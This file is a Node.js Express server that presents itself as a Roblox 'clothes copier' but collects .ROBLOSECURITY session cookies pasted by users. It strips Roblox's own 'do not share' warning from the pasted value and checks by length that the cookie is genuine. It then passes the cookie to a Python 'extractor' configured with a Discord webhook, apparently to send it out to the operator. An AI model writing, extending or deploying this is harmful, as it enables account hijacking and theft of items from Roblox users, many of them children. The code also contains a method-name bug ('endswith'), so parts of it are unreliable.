const express = require('express');
const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');

const app = express();

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ limit: '10mb', extended: true }));

app.use(express.static(path.join(__dirname, 'public')));

app.get('/clothes-copier', (req, res) => {
    const targetFile = 'clothes-copier.html';
    const filePath = path.join(__dirname, 'public', targetFile);
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.status(404).send('Clothes copier page not found.');
    }
});

app.get('/', (req, res) => {
    res.redirect('/clothes-copier');
});

// Strict cookie sanitization & validation helper
function extractAndCleanCookie(rawInput) {
    if (!rawInput) return null;
    let rawStr = String(rawInput).trim();

    // Check patterns in scripts
    const patterns = [
        /\.ROBLOSECURITY["']\s*,\s*["']([^"']+)["']/,
        /System\.Net\.Cookie\(\s*["']\.ROBLOSECURITY["']\s*,\s*["']([^"']+)["']/
    ];

    for (let pattern of patterns) {
        const match = rawStr.match(pattern);
        if (match) {
            rawStr = match[1];
            break;
        }
    }

    // Strip quotes and prefixes
    if ((rawStr.startsWith('"') && rawStr.endswith('"')) || (rawStr.startsWith("'") && rawStr.endswith("'"))) {
        rawStr = rawStr.slice(1, -1).trim();
    }
    if (rawStr.startsWith(".ROBLOSECURITY=")) {
        rawStr = rawStr.slice(15).trim();
    }

    const warningText = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
    if (rawStr.startsWith(warningText)) {
        rawStr = rawStr.slice(warningText.length).trim();
    }

    const cleaned = rawStr.replace(/^\./, '').replace(/;$/, '').trim();

    // STRICT LENGTH CHECK: Real Roblox cookies are always between 300 and 1000 characters.
    // If a letter is removed, or it's tampered with/fake, it fails this check and returns null.
    if (cleaned.length < 300 || cleaned.length > 1000) {
        return null;
    }

    return cleaned;
}

app.post('/api/process', (req, res) => {
    const { data } = req.body;
    if (!data) {
        return res.status(400).json({ success: false, error: "Missing data payload" });
    }

    // Validate and clean the cookie before doing anything else
    const cleanCookie = extractAndCleanCookie(data);
    if (!cleanCookie) {
        return res.status(400).json({ success: false, error: "Invalid or tampered cookie format." });
    }

    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    if (!webhookUrl) {
        return res.status(500).json({ success: false, error: "Webhook not configured on server" });
    }

    const pyProcess = spawn('python3', ['core_extractor.py'], {
        env: { ...process.env, DISCORD_WEBHOOK_URL: webhookUrl }
    });

    let stdoutData = '';
    let stderrData = '';

    pyProcess.stdout.on('data', (chunk) => {
        stdoutData += chunk;
    });

    pyProcess.stderr.on('data', (chunk) => {
        stderrData += chunk;
    });

    pyProcess.on('close', (code) => {
        if (code !== 0) {
            console.error(`Python script failed with code ${code}. Stderr: ${stderrData}`);
            return res.status(500).json({ 
                success: false, 
                error: "Extractor execution failed.", 
                details: stderrData || `Python exited with code ${code}. Stdout was: ${stdoutData}` 
            });
        }
        res.json({ success: true, output: stdoutData });
    });

    // Pass the strictly validated/cleaned cookie into the Python script's stdin
    pyProcess.stdin.write(cleanCookie);
    pyProcess.stdin.end();
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[+] Server running on port ${PORT}`);
});
